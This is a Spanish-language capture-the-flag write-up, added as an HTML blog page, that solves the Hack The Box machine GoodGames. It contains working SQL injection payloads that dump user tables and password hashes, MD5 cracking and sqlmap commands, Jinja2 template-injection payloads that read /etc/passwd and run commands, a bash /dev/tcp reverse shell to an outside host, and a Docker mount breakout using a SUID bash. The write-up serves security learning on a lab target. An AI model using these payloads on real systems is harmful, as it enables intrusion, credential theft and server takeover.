@@ -1,0 +1,408 @@
+<!DOCTYPE html>
+<html lang="es">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <link rel="stylesheet" type="text/css" href="https://alimh0x.github.io/theme/css/elegant.prod.9e9d5ce754.css" media="screen">
+        <link rel="stylesheet" type="text/css" href="https://alimh0x.github.io/theme/css/custom.css" media="screen">
+
+
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+
+
+        <link rel="dns-prefetch" href="//fonts.googleapis.com">
+        <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin>
+
+        <meta name="author" content="Alexis Imhoff" />
+
+        <meta property="og:type" content="article" />
+        <meta name="twitter:card" content="summary">
+
+<meta name="keywords" content="CTF, offensive, SQLi, SSTI, Docker Breakout, HTB, " />
+
+<meta property="og:title" content="Resolución de máquina GoodGames "/>
+<meta property="og:url" content="https://alimh0x.github.io/htb-goodgames.html" />
+<meta property="og:description" content="Enumeración Escaneo de puertos: nmap -p- --open --min-rate 5000 -vvv -sS -n -Pn 10.10.11.130 Host is up, received user-set (0.31s latency). Scanned at 2024-06-09 19:55:19 -03 for 17s Not shown: 62795 closed tcp ports (reset), 2739 filtered tcp ports (no-response) Some closed ports may …" />
+<meta property="og:site_name" content="alimh blog" />
+<meta property="og:article:author" content="Alexis Imhoff" />
+<meta property="og:article:published_time" content="2024-11-15T00:00:00-03:00" />
+<meta name="twitter:title" content="Resolución de máquina GoodGames ">
+<meta name="twitter:description" content="Enumeración Escaneo de puertos: nmap -p- --open --min-rate 5000 -vvv -sS -n -Pn 10.10.11.130 Host is up, received user-set (0.31s latency). Scanned at 2024-06-09 19:55:19 -03 for 17s Not shown: 62795 closed tcp ports (reset), 2739 filtered tcp ports (no-response) Some closed ports may …">
+
+        <title>Resolución de máquina GoodGames  · alimh blog
+</title>
+
+
+
+    </head>
+    <body>
+        <div id="content">
+            <div class="navbar navbar-static-top">
+                <div class="navbar-inner">
+                    <div class="container-fluid">
+                        <a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">
+                            <span class="icon-bar"></span>
+                            <span class="icon-bar"></span>
+                            <span class="icon-bar"></span>
+                        </a>
+                        <a class="brand" href="https://alimh0x.github.io/"><span class=site-name>alimh blog</span></a>
+                        <div class="nav-collapse collapse">
+                            <ul class="nav pull-right top-menu">
+                                <li >
+                                    <a href=
+                                       https://alimh0x.github.io
+                                    >Home</a>
+                                </li>
+                                <li ><a href="https://alimh0x.github.io/categories.html">Categories</a></li>
+                                <li ><a href="https://alimh0x.github.io/tags.html">Tags</a></li>
+                                <li ><a href="https://alimh0x.github.io/archives.html">Archives</a></li>
+                                <li><form class="navbar-search" action="https://alimh0x.github.io/search.html" onsubmit="return validateForm(this.elements['q'].value);"> <input type="text" class="search-query" placeholder="Search" name="q" id="tipue_search_input"></form></li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="container-fluid">
+              <div class="row-fluid">
+                <div class="span2"> 
+<aside id="sidebar">
+    <div class="about-me">
+        <img src="https://alimh0x.github.io/images/avatar.webp" alt="Mi Foto" class="avatar">
+        <p>Hola! Soy Alexis Imhoff. Ingeniero en informática apasionado por la ciberseguridad. En este blog subiré writeups de CTFs y algun que otro tema relacionado a seguridad.</p>
+        <ul class="social-links">
+            <li>
+                <a href="https://www.linkedin.com/in/alexis-imhoff/" target="_blank" rel="noopener noreferrer">
+                    <i class="fab fa-linkedin"></i>
+                    <!-- Linkedin -->
+              </a>
+            </li>
+        </ul>
+    </div>
+</aside>
+                </div>
+              <div class="span10">
+<article itemscope>
+<div class="row-fluid">
+    <header class="page-header span10 offset1">
+        <h1>
+            <a href="https://alimh0x.github.io/htb-goodgames.html">
+                Resolución de máquina GoodGames
+            </a>
+        </h1>
+    </header>
+</div>
+
+<div class="row-fluid">
+        <div class="span8 offset1 article-content">
+            
+            <p><img alt="machine" src="images/images_htb_goodgames/goodgames_logo.jpg"></p>
+<h1>Enumeración</h1>
+<p>Escaneo de puertos:</p>
+<div class="highlight"><pre><span></span><code>nmap -p- --open --min-rate 5000 -vvv -sS -n -Pn 10.10.11.130
+</code></pre></div>
+
+<div class="highlight"><pre><span></span><code>Host is up, received user-set (0.31s latency).
+Scanned at 2024-06-09 19:55:19 -03 for 17s
+Not shown: 62795 closed tcp ports (reset), 2739 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT   STATE SERVICE REASON
+80/tcp open  http    syn-ack ttl 63
+</code></pre></div>
+
+<p>Detectamos versión y servicio de los puertos abiertos:</p>
+<div class="highlight"><pre><span></span><code>nmap -sCV -p80 10.10.11.130
+</code></pre></div>
+
+<div class="highlight"><pre><span></span><code>Host is up (0.28s latency).
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.51
+|_http-title: GoodGames | Community and Store
+|_http-server-header: Werkzeug/2.0.2 Python/3.9.2
+Service Info: Host: goodgames.htb
+</code></pre></div>
+
+<p>Notamos que se está utilizando Virtual Hosting, por lo que cargamos el registro <em>goodgames.htb</em> a nuestro <em>/etc/hosts</em></p>
+<p><img alt="goodgames" src="images/images_htb_goodgames/htb_goodgames-1.jpg"></p>
+<p>Vamos a realizar fuzzing para intentar encontrar directorios ocultos.</p>
+<div class="highlight"><pre><span></span><code>gobuster dir -u http://goodgames.htb -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t <span class="m">50</span> --exclude-lenght <span class="m">9265</span>
+</code></pre></div>
+
+<p><img alt="goodgames" src="images/images_htb_goodgames/htb_goodgames-2.jpg"></p>
+<p>El sitio nos permite registrarnos, por lo que vamos a hacerlo: </p>
+<p><img alt="goodgames" src="images/images_htb_goodgames/htb_goodgames-3.jpg"></p>
+<h1>Intrusión - SQLi manual</h1>
+<p>Nos conectamos con las credenciales del usuario que acabams de crear. Al momento de loguearnos, capturamos la request con Burpsuite. Vemos que obtenemos un 200 OK y se están tramitando los parámetros email y password:</p>
+<p><img alt="goodgames" src="images/images_htb_goodgames/htb_goodgames-4.jpg"></p>
+<p>Dentro de la respuesta, también vemos un mensaje de <strong>Welcome aimhoff</strong>. Si probamos agregar una comilla luego de nuestro email, continuamos teniendo un 200 OK. </p>
+<p>Ahora, lo volvemos a modificar y agregamos <strong>' OR 1=1-- -';</strong>. Obtenemos un 200 OK y vemos que el mensaje que nos muestra ahora es <strong>Welcome adminaimhoff</strong>:</p>
+<p><img alt="goodgames" src="images/images_htb_goodgames/htb_goodgames-5.jpg"></p>
+<p>Siendo vulnerable a un SQL Injection, lo primero que haremos será ver la cantidad de columnas que tiene la tabla que se está consultando.</p>
+<div class="highlight"><pre><span></span><code><span class="n">email</span><span class="o">=</span><span class="n">aimhoff</span><span class="o">@</span><span class="n">test</span><span class="p">.</span><span class="n">com</span><span class="err">&#39;</span><span class="w"> </span><span class="k">order</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="mi">4</span><span class="c1">-- -;&amp;password=Password123</span>
+</code></pre></div>
+
+<p>Iremos <em>jugando</em> con el ORDER BY hasta que no obtengamos errores. En este caso, con 4 no da error (con 5 ya si), por lo que la tabla tiene 4 columnas:</p>
+<p><img alt="goodgames" src="images/images_htb_goodgames/htb_goodgames-6.jpg"></p>
+<p>Saber esto es importante, ya que ahora concatenaremos consultas utlizando UNION SELECT (las consultas que hagamos dentro del UNION SELECT, deben tener la misma cantidad de columnas que el primer SELECT). Obtendremos la base de datos en uso haciendo la siguiente consulta:</p>
+<div class="highlight"><pre><span></span><code><span class="n">email</span><span class="o">=</span><span class="err">&#39;</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="k">database</span><span class="p">()</span><span class="c1">-- -;&amp;password=Password123</span>
+</code></pre></div>
+
+<p><img alt="goodgames" src="images/images_htb_goodgames/htb_goodgames-7.jpg"></p>
+<p>Ahora, listaremos todas las bases de datos que existen:</p>
+<div class="highlight"><pre><span></span><code><span class="n">email</span><span class="o">=</span><span class="err">&#39;</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="n">group_concat</span><span class="p">(</span><span class="k">schema_name</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">schemata</span><span class="c1">-- -&amp;password=Password123</span>
+</code></pre></div>
+
+<p>Hay dos, <strong>main</strong> y <strong>information_schema</strong>:</p>
+<p><img alt="goodgames" src="images/images_htb_goodgames/htb_goodgames-8.jpg"></p>
+<p>Listamos las tablas de la base de datos <strong>main</strong>:</p>
+<div class="highlight"><pre><span></span><code><span class="n">email</span><span class="o">=</span><span class="s1">&#39; union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=&#39;</span><span class="n">main</span><span class="err">&#39;</span><span class="c1">-- -&amp;password=Password123</span>
+</code></pre></div>
+
+<p>Existen tres, <strong>blog</strong>, <strong>blog_comments</strong>, <strong>user</strong>:</p>
+<p><img alt="goodgames" src="images/images_htb_goodgames/htb_goodgames-9.jpg"></p>
+<p>Listando las columnas de la tabla <strong>user</strong>:</p>
+<div class="highlight"><pre><span></span><code><span class="n">email</span><span class="o">=</span><span class="s1">&#39; union select 1,2,3,group_concat(column_name) from information_schema.columns where table_schema=&#39;</span><span class="n">main</span><span class="s1">&#39; and table_name=&#39;</span><span class="k">user</span><span class="err">&#39;</span><span class="c1">-- -&amp;password=Password123</span>
+</code></pre></div>
+
+<p>Tiene cuatro columnas: <strong>email</strong>, <strong>id</strong>, <strong>name</strong> y <strong>password</strong>:</p>
+<p><img alt="goodgames" src="images/images_htb_goodgames/htb_goodgames-10.jpg"></p>
+<p>Listando los campos <strong>email</strong> y <strong>password</strong> de la tabla users:</p>
+<div class="highlight"><pre><span></span><code><span class="n">email</span><span class="o">=</span><span class="s1">&#39; union select 1,2,3,group_concat(email,&#39;</span><span class="p">:</span><span class="err">&#39;</span><span class="p">,</span><span class="n">password</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="k">user</span><span class="c1">-- -&amp;password=Password123</span>
+</code></pre></div>
+
+<p>Obtenemos los siguientes datos:</p>
+<div class="highlight"><pre><span></span><code>admin@goodgames.htb:2b22337f218b2d82dfc3b6f77e7cb8ec
+aimhoff@test.com:42f749ade7f9e195bf475f37a44cafcb
+</code></pre></div>
+
+<p><img alt="goodgames" src="images/images_htb_goodgames/htb_goodgames-11.jpg"></p>
+<p>El hash está en MD5, vamos a intentar obtenerlo utilizando <em>John the Ripper</em> y el diccionario rockyou:</p>
+<div class="highlight"><pre><span></span><code>john --format<span class="o">=</span>Raw-MD5 --wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt hash.txt
+</code></pre></div>
+
+<p><img alt="goodgames" src="images/images_htb_goodgames/htb_goodgames-12.jpg"></p>
+<p>Probamos acceder y tenemos éxito:</p>
+<p><img alt="goodgames" src="images/images_htb_goodgames/htb_goodgames-13.jpg"></p>
+<h1>Intrusión - SQLMap</h1>
+<p>Utilizando SQLMap podemos llegar al mismo resultado. Nos guardamos la primera request que obtuvimos a través de Burpsuite y seguimos este orden para ir dumpeando lo que nos interesa:</p>
+<div class="highlight"><pre><span></span><code>sqlmap -r request.req -p email --batch 
+sqlmap -r request.req -p email --batch -D main --tables
+sqlmap -r request.req -p email --batch -D main -T user --columns
+sqlmap -r request.req -p email --batch -D main -T user -C email,password --dump
+</code></pre></div>
+
+<p><img alt="goodgames" src="images/images_htb_goodgames/htb_goodgames-14.jpg"></p>
+<h1>Server-Side Template Injection (SSTI)</h1>
+<p>Continuando, vemos que al ser admin, tenemos acceso también a un panel de administración. Nos logueamos con las mismas credenciales:</p>
+<p><img alt="goodgames" src="images/images_htb_goodgames/htb_goodgames-15.jpg"></p>
+<p>Nos dirigimos a <strong>Settings</strong> e intentamos modificar el <strong>Full Name</strong>. Vemos que es vulnerable a <strong>Server-Side Template Inection (SSTI)</strong>, ya que si ponemos <strong>{{7*7}}</strong> realiza la operación matemática y en el output muestra 49:</p>
+<p><img alt="goodgames" src="images/images_htb_goodgames/htb_goodgames-16.jpg"></p>
+<p>Para seguir, vamos a utilizar el siguiente recurso de <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2---read-remote-file">PayloadsAllTheThings</a>. Intentaremos leer un archivo local de la máquina. Probamos las distintas opciones que nos ofrece el repositorio y nos funciona esta:</p>
+<div class="highlight"><pre><span></span><code><span class="p">{{</span> <span class="n">get_flashed_messages</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">__builtins__</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s2">&quot;/etc/passwd&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span> <span class="p">}}</span>
+</code></pre></div>
+
+<p><img alt="goodgames" src="images/images_htb_goodgames/htb_goodgames-17.jpg"></p>
+<p>Si utilizamos la siguiente instrucción, podemos ejecutar comandos. En este caso, el comando <strong>id</strong>:</p>
+<div class="highlight"><pre><span></span><code><span class="p">{{</span> <span class="bp">self</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">__builtins__</span><span class="o">.</span><span class="n">__import__</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span> <span class="p">}}</span>
+</code></pre></div>
+
+<p><img alt="goodgames" src="images/images_htb_goodgames/htb_goodgames-18.jpg"></p>
+<h3>Reverse Shell</h3>
+<p>Al tener RCE, nos entablamos una Reverse Shell ejecutando lo siguiente: </p>
+<div class="highlight"><pre><span></span><code><span class="p">{{</span> <span class="bp">self</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">__builtins__</span><span class="o">.</span><span class="n">__import__</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.13/443 0&gt;&amp;1&quot;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span> <span class="p">}}</span>
+</code></pre></div>
+
+<p><img alt="goodgames" src="images/images_htb_goodgames/htb_goodgames-19.jpg"></p>
+<p>Primero hacemos un tratamiento de la TTY. Luego, desde aquí, podemos ver la primer flag:</p>
+<p><img alt="goodgames" src="images/images_htb_goodgames/htb_goodgames-20.jpg"></p>
+<h1>Escalación de privilegios</h1>
+<p>Notamos que estamos dentro de un contenedor de Docker. Si hacemos un <em>ifconfig</em>, vemos que la IP del contenedor es la 172.19.0.2:</p>
+<p><img alt="goodgames" src="images/images_htb_goodgames/htb_goodgames-21.jpg"></p>
+<p>Asimismo, si listamos el <em>/etc/passwd</em>, vemos que el usuario <strong>augustus</strong> no existe en el contenedor. Esto nos da la idea de que puede existir en la máquina anfitriona, y que el directorio <em>/home/augustus</em> es una <strong>montura</strong>. Es decir, lo que se ponga en la máquina host en el directorio <em>/home/augustus</em>, se reflejará en contenedor.</p>
+<p>Por lo general, la IP 172.19.0.1 corresponde a la IP de la máquina que está alojando el contenedor. Vamos a ver qué puertos tiene abiertos utilizando el siguiente bucle en bash:</p>
+<div class="highlight"><pre><span></span><code><span class="k">for</span> port <span class="k">in</span> <span class="o">{</span><span class="m">1</span>..65535<span class="o">}</span><span class="p">;</span> <span class="k">do</span> <span class="nb">echo</span> &gt; /dev/tcp/172.19.0.1/<span class="nv">$port</span> <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">&quot;</span><span class="nv">$port</span><span class="s2"> abierto&quot;</span> <span class="p">;</span> <span class="k">done</span> <span class="m">2</span>&gt;/dev/null
+</code></pre></div>
+
+<p><img alt="goodgames" src="images/images_htb_goodgames/htb_goodgames-22.jpg"></p>
+<p>Tiene abiertos el 22 y el 80.</p>
+<p>Intentamos conectarnos vía SSH a la IP 172.19.0.1. Primero probamos con el usuario root y la contraseña que tenemos, pero no podemos. Por lo tanto, vamos a probar con el usuario <strong>augustus</strong> y la misma contraseña, y ahora si podemos entrar: </p>
+<p><img alt="goodgames" src="images/images_htb_goodgames/htb_goodgames-23.jpg"></p>
+<p>Para escalar privilegios, lo que vamos a hacer es, primero, en la máquina anfitriona, copiar el binario de bash al directorio <em>/home/augustus</em>:</p>
+<p><img alt="goodgames" src="images/images_htb_goodgames/htb_goodgames-24.jpg"></p>
+<p>Luego, volvemos al contenedor, y como aquí somos root, vamos a cambiarle el propietario al binario y asignarle permisos SUID: </p>
+<p><img alt="goodgames" src="images/images_htb_goodgames/htb_goodgames-25.jpg"></p>
+<p>Volvemos a la PC anfitriona con el usuario augustus, y como ahora el binario bash se puede ejecutar como si fuésemos el propietario, lo corremos con <strong>./bash -p</strong> </p>
+<p><img alt="goodgames" src="images/images_htb_goodgames/htb_goodgames-26.jpg"></p>
+<p>En este punto somos root y ahora si podemos ver la flag restante:</p>
+<p><img alt="goodgames" src="images/images_htb_goodgames/htb_goodgames-27.jpg"></p>
+<p>Este es el problema de tener monturas en Docker.</p>
+
+
+             
+ 
+            
+            
+            
+
+
+
+
+
+
+
+            <hr/>
+        </div>
+        <section id="article-sidebar" class="span2">
+            <h4>Published</h4>
+            <time itemprop="dateCreated" datetime="2024-11-15T00:00:00-03:00">vie 15 noviembre 2024</time>
+            <h4>Category</h4>
+            <a class="category-link" href="https://alimh0x.github.io/categories.html#htb-ref">HTB</a>
+            <h4>Tags</h4>
+            <ul class="list-of-tags tags-in-article">
+                <li><a href="https://alimh0x.github.io/tags.html#ctf-ref">CTF
+                    <span class="superscript">13</span>
+</a></li>
+                <li><a href="https://alimh0x.github.io/tags.html#docker-breakout-ref">Docker Breakout
+                    <span class="superscript">1</span>
+</a></li>
+                <li><a href="https://alimh0x.github.io/tags.html#offensive-ref">offensive
+                    <span class="superscript">15</span>
+</a></li>
+                <li><a href="https://alimh0x.github.io/tags.html#sqli-ref">SQLi
+                    <span class="superscript">1</span>
+</a></li>
+                <li><a href="https://alimh0x.github.io/tags.html#ssti-ref">SSTI
+                    <span class="superscript">1</span>
+</a></li>
+            </ul>
+            
+
+
+
+
+
+            
+
+
+
+
+
+        </section>
+</div>
+</article>
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe.
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides.
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo https://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>              </div>
+            </div>
+        </div>
+<footer>
+
+
+
+
+    <div id="fpowered">
+        Powered by: <a href="http://getpelican.com/" title="Pelican Home Page" target="_blank" rel="nofollow noopener noreferrer">Pelican</a>
+        Theme: <a href="https://elegant.oncrashreboot.com/" title="Theme Elegant Home Page" target="_blank" rel="nofollow noopener noreferrer">Elegant</a>
+    </div>
+</footer>            <script src="//code.jquery.com/jquery.min.js"></script>
+        <script src="//netdna.bootstrapcdn.com/twitter-bootstrap/2.3.2/js/bootstrap.min.js"></script>
+        <script src="https://alimh0x.github.io/theme/js/elegant.prod.9e9d5ce754.js"></script>
+        <script>
+            function validateForm(query)
+            {
+                return (query.length > 0);
+            }
+        </script>
+
+    <script>
+    (function () {
+        if (window.location.hash.match(/^#comment-\d+$/)) {
+            $('#comment_thread').collapse('show');
+        }
+    })();
+    window.onhashchange=function(){
+        if (window.location.hash.match(/^#comment-\d+$/))
+            window.location.reload(true);
+    }
+    $('#comment_thread').on('shown', function () {
+        var link = document.getElementById('comment-accordion-toggle');
+        var old_innerHTML = link.innerHTML;
+        $(link).fadeOut(200, function() {
+            $(this).text('Click here to hide comments').fadeIn(200);
+        });
+        $('#comment_thread').on('hidden', function () {
+            $(link).fadeOut(200, function() {
+                $(this).text(old_innerHTML).fadeIn(200);
+            });
+        })
+    })
+</script>
+
+    </body>
+    <!-- Theme: Elegant built for Pelican
+        License : MIT -->
+</html>
